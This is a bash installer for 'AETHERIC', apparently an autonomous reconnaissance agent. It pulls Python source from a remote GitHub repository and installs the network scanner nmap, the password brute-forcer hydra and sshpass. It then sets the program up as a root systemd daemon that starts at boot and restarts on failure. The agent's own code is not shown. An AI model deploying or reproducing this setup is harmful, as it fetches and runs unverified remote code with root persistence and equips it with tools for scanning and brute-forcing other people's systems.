#!/bin/bash
# AETHERIC Installation Script (source-based, no binary)
set -e

REPO_URL="https://raw.githubusercontent.com/reconagent/version_1/main"
WORKDIR="/tmp/aetheric_install"
DESTDIR="/usr/local/aetheric"

# ------------------------------------------------------------------
# 1. Prepare working directory
# ------------------------------------------------------------------
mkdir -p "$WORKDIR"
cd "$WORKDIR"

# ------------------------------------------------------------------
# 2. Install system dependencies
# ------------------------------------------------------------------
apt-get update -y
apt-get install -y python3 python3-venv python3-pip git build-essential nmap hydra sshpass rsync

# ------------------------------------------------------------------
# 3. Download all source files (including config.py)
# ------------------------------------------------------------------
for file in main.py config.py core/*.py modules/*.py utils/*.py requirements.txt; do
    mkdir -p "$(dirname "$file")"
    curl -s -o "$file" "$REPO_URL/$file"
done

# Ensure __init__.py exists (package markers)
touch core/__init__.py modules/__init__.py utils/__init__.py

# ------------------------------------------------------------------
# 4. Copy everything to permanent location
# ------------------------------------------------------------------
rm -rf "$DESTDIR"
mkdir -p "$DESTDIR"
cp -r . "$DESTDIR/"
cd "$DESTDIR"

# ------------------------------------------------------------------
# 5. Create virtual environment and install Python deps
# ------------------------------------------------------------------
python3 -m venv venv
source venv/bin/activate
pip install --upgrade pip
pip install -r requirements.txt

# ------------------------------------------------------------------
# 6. Create systemd service (runs Python script directly)
# ------------------------------------------------------------------
cat > /etc/systemd/system/aetheric.service <<EOF
[Unit]
Description=Aetheric Daemon
After=network.target

[Service]
Type=simple
ExecStart=$DESTDIR/venv/bin/python $DESTDIR/main.py --resume
Restart=on-failure
RestartSec=10
User=root
MemoryMax=4G
CPUQuota=300%
TimeoutStopSec=300

[Install]
WantedBy=multi-user.target
EOF

# ------------------------------------------------------------------
# 7. Enable and start the service
# ------------------------------------------------------------------
systemctl daemon-reload
systemctl enable aetheric
systemctl start aetheric

# ------------------------------------------------------------------
# 8. Cleanup temporary directory
# ------------------------------------------------------------------
cd /
rm -rf "$WORKDIR"

echo "AETHERIC installed and running from source."
echo "Check status: systemctl status aetheric"
echo "View logs: journalctl -u aetheric -f"